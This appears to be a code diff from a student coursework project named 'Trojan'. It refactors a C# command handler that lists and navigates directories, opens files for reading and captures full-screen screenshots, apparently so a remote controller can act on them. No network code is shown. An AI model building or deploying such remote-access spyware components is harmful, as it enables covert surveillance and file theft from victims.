@@ -1,24 +1,20 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Windows;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Windows.Media.Imaging;
 using Point = System.Drawing.Point;
 using Size = System.Drawing.Size;
-using System.Drawing.Imaging;
-using System.Windows.Media.Imaging;
 
 namespace CourseWork.Trojan
 {
-    internal static class CommandReaction
+    internal class CommandReaction
     {
-        static public string CurrentDirectory { get; private set; } = Environment.CurrentDirectory;
+        public string CurrentDirectory { get; private set; } = Environment.CurrentDirectory;
 
-        static public string[] GetDirectoryContent()
+        public string[] GetDirectoryContent()
         {
             List<string> directoryContent = new List<string>();
 
@@ -33,39 +29,56 @@ namespace CourseWork.Trojan
             return directoryContent.ToArray();
         }
 
-        static public string GoToFolder(string folder)
+        public string GoToFolder(string folder)
         {
             string newPath = CurrentDirectory + "\\" + folder;
-            return Directory.Exists(newPath) ? newPath 
-                : CurrentDirectory;
+
+            if (Directory.Exists(newPath))
+            {
+                CurrentDirectory = newPath;
+                return newPath;
+            }
+
+            return "Ошибка";
         }
 
-        static public string BackToFolder()
+        public string AboveDirectory()
         {
             string[] currentPath = CurrentDirectory.Split('\\');
             string newPath = "";
 
-            for (int directory = 0; directory < currentPath.Length - 2; directory++)
+            for (int directory = 0; directory < currentPath.Length - 1; directory++)
             {
-                newPath += (directory != currentPath.Length - 2) ? currentPath[directory] + "\\"
-                    : currentPath[directory];
+                if (directory != currentPath.Length - 2)
+                {
+                    newPath += currentPath[directory] + "\\";
+                }
+                else
+                {
+                    newPath += currentPath[directory];
+                }
             }
 
-            return Directory.Exists(newPath) ? newPath
-                : CurrentDirectory;
+            if (Directory.Exists(newPath))
+            {
+                CurrentDirectory = newPath;
+                return newPath;
+            }
+
+            return "Ошибка";
         }
 
-        static public Stream ReadFile(string name)
+        public Stream ReadFile(string name)
         {
             return File.OpenRead(CurrentDirectory + "\\" + name);
         }
 
-        static public bool FindFileInCurrentDirectory(string file)
+        public bool FindFileInCurrentDirectory(string file)
         {
             return File.Exists(CurrentDirectory + "\\" + file);
         }
 
-        static public string GetScreenshotPath()
+        public string GetScreenshotPath()
         {
             Rectangle rect = new Rectangle(new Point(0, 0),
                 new Size((int)SystemParameters.PrimaryScreenWidth, (int)SystemParameters.PrimaryScreenHeight));
@@ -74,7 +87,7 @@ namespace CourseWork.Trojan
             return Path.GetTempPath() + "screen.jpg";
         }
 
-        static private BitmapImage CaptureRect(Rectangle rect, ImageFormat format)
+        private BitmapImage CaptureRect(Rectangle rect, ImageFormat format)
         {
             using (var ms = new MemoryStream())
             {
@@ -95,7 +108,7 @@ namespace CourseWork.Trojan
             }
         }
 
-        static private Bitmap BitmapImageToBitmap(BitmapImage bitmapSource)
+        private Bitmap BitmapImageToBitmap(BitmapImage bitmapSource)
         {
             using (MemoryStream outstream = new MemoryStream())
             {
@@ -106,7 +119,7 @@ namespace CourseWork.Trojan
             }
         }
 
-        static private string CutPath(string path)
+        private string CutPath(string path)
         {
             string[] pathSplit = path.Split('\\');
             return pathSplit[pathSplit.Length - 1];
